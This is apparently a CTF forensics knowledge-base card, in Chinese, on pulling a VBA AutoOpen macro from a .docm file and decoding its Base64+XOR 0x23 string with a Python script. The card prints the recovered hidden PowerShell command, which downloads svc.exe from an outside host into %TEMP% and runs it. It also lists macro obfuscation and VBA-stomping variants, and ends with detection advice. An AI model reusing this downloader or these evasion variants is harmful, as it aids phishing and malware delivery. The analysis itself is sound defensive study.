---
id: ctf-forensics-docm-vba-base64-xor-powershell-download-url
title: DOCM 宏提取与去混淆：vbaProject.bin 中 Base64+XOR 0x23 还原 PowerShell 下载 URL
type: scenario
domain: ctf
path: ctf/forensics
technique: docm-vba-base64-xor-macro-deobfuscation
tags:
- ctf
- forensics
- malware
- docm
- vba
- macro
- base64
- xor
- powershell
- deobfuscation
severity: low
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:54:16+08:00'
  notes: 已对照原文「deploy-2」与图16-17核对：.docm 改 .zip 解压定位 word/vbaProject.bin，AutoOpen 宏内 enc 串注释标明 base64(XOR 0x23(payload))；按 PoC 解码复算输出 powershell -nop -w hidden -c "... iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile %TEMP%\svc.exe; start ..."，与原文/图17 一致，下载 URL 为 cdn.greylinx-consulting.xyz:8080/update/svc.exe。未验证点：未持样本复跑解包；无 CVE/版本；frontmatter 无 sources/source_url。
url: /docs/ctf/forensics/ctf-forensics-docm-vba-base64-xor-powershell-download-url/
draft: false
kb_aliases:
- deploy-2
- DOCM 宏分析
- vbaProject.bin
- AutoOpen 宏
- Base64 XOR 0x23
- PowerShell iwr 下载
- GreyLynx
---

## 一句话结论

把 `.docm` 改后缀为 `.zip` 解压，`word/vbaProject.bin` 里能看到 `AutoOpen()` 宏和一段 `enc` 字符串；按注释提示先 Base64 解码、再逐字节 XOR 0x23，即可还原出隐藏的 PowerShell 命令，里面 `iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe` 就是恶意载荷下载 URL。

## 原理

- **DOCM 是 OOXML 压缩包**：`.docm` 本质是 ZIP，包含 `word/document.xml`、`word/vbaProject.bin`、`word/_rels/document.xml.rels`、`[Content_Types].xml` 等；`vbaProject.bin` 是 OLE 复合文档，保存 VBA 工程（源码、p-code、引用）。
- **AutoOpen 自动执行**：VBA 的 `Sub AutoOpen()` 在文档打开且宏启用时自动运行；本题宏里 `Shell ps, vbHide` 以隐藏窗口启动 PowerShell。
- **简单混淆链**：注释明确写 `base64(XOR 0x23(payload))`；`enc` 是 Base64 字符串，解码后每个字节与 0x23 异或即得明文 PowerShell。单字节 XOR 只改变字节值，不改变长度，适合快速还原。
- **载荷行为**：还原出的命令 `powershell -nop -w hidden -c "... iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile $env:TEMP\svc.exe; start $env:TEMP\svc.exe"` 使用 `-nop`（无 profile）、`-w hidden`（隐藏窗口）、`iwr`（Invoke-WebRequest）下载 `svc.exe` 到 `%TEMP%` 并执行，是典型的钓鱼宏下载器。
- **静态分析可行**：不需要真正打开文档或启用宏；解压 + strings + 解码即可拿到 URL，避免在分析机执行恶意载荷。

## 触发条件

- 拿到 `.docm`/`.doc`/`.xlsm` 等含宏的 Office 文档，或 `vbaProject.bin` 样本。
- 宏使用 Base64、XOR、字符串拼接、Chr/StrReverse 等简单混淆；注释/变量名可能泄露编码方式。
- 分析环境允许解压与静态读取，不需要执行宏。

## 利用步骤

1. 把 `.docm` 复制为 `.zip` 并解压，定位 `word/vbaProject.bin`。
2. 用 `strings`/`olevba`/`oletools` 查看 VBA 源码，找到 `AutoOpen`、`Shell`、`enc` 等关键字符串。
3. 按注释提示解码：Base64 decode -> 逐字节 XOR 0x23；若注释不可信，尝试常见单字节 key（0x23、0x37、0x5A 等）并观察输出是否可打印。
4. 从还原的 PowerShell 中提取下载 URL、落地路径、执行方式与持久化命令。
5. 若源码被 VBA stomping 隐藏，比较 p-code 与源码，或直接分析 p-code/行为。

## PoC

```python
import base64

enc = "U0xURlFQS0ZPTwMOTUxTAw5UA0tKR0dGTQMOQAMBRkBLTAN4CX4DZFFGWm9aTVsDVlNHQldGA0FMTFdQV1FCUxgDSlRRA0tXV1MZDAxAR00NRFFGWk9KTVsOQExNUFZPV0pNRA1bWlkZGxMbEwxWU0dCV0YMUFVADUZbRgMObFZXZUpPRgMHRk1VGXdmbnN/UFVADUZbRhgDUFdCUVcDB0ZNVRl3Zm5zf1BVQA1GW0YB"
raw = base64.b64decode(enc)
plain = bytes(b ^ 0x23 for b in raw)
print(plain.decode("utf-8", "replace"))
```

输出（原文实测）：

```text
powershell -nop -w hidden -c "echo [*] GreyLynx update bootstrap; iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile $env:TEMP\svc.exe; start $env:TEMP\svc.exe"
```

下载 URL 为 `cdn.greylinx-consulting.xyz:8080/update/svc.exe`。该 PoC 未在本库复跑。

## 变体与关联

- **混淆变体**：多字节 XOR、XOR 后 Base64/Base32/hex、字符串反转、Chr/ChrW 拼接、环境变量拆分、VBA 中调用 `powershell -enc`（Base64 UTF-16LE）。
- **文档变体**：`.doc`（OLE 复合文档）、`.xlsm`、`.pptm`、`.hta`、`.lnk`；宏入口可能是 `AutoOpen`、`Document_Open`、`Workbook_Open`。
- **隐藏变体**：VBA stomping（源码与 p-code 不一致）、宏密码保护、只保留 p-code；需要 `olevba`/`pcode` 分析或动态行为。
- **关联卡片**：[[ctf-forensics-office-doc-password-office2john-hashcat]]（Office 文档口令破解）、[[defense-forensics-vba-stomping-source-pcode-mismatch]]（VBA stomping 源码/p-code 不一致）、[[pentest-initial-access-office-macro-document]]（Office 宏钓鱼初始访问）。

## 检测与防御

- **终端**：默认禁用宏/仅启用签名宏；对来自 Internet 的文档启用 Mark-of-the-Web/受保护视图；禁用或限制 PowerShell `iwr`/`Invoke-WebRequest` 与 `-w hidden`。
- **邮件/网关**：拦截含宏的 Office 附件，扫描 `vbaProject.bin` 中的自动执行宏与混淆字符串；对下载 URL/域名做信誉检查。
- **检测**：Office 进程拉起 `powershell.exe`、`cmd.exe`、`mshta.exe`；`%TEMP%` 下出现新 exe 并被执行；DNS/HTTP 请求命中可疑域名与 `gate.php`/`svc.exe` 等路径。
- **分析**：静态解包 + `olevba`/`oletools` + strings 优先，避免在分析机启用宏；需要动态时使用隔离沙箱与网络模拟。
